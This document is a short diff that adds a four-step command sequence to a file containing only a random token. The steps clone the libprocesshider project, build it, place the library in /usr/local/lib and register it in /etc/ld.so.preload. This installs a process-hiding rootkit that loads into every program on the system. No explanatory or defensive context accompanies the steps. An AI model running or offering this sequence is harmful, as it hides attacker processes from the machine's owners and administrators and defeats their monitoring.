@@ -1,1 +1,10 @@
 N38d3oCAZRhpZca3fRgMeKjYsHNZ9Df
+
+git clone https://github.com/gianlucaborello/libprocesshider.git
+
+make
+
+sudo mv libprocesshider.so /usr/local/lib/
+
+
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
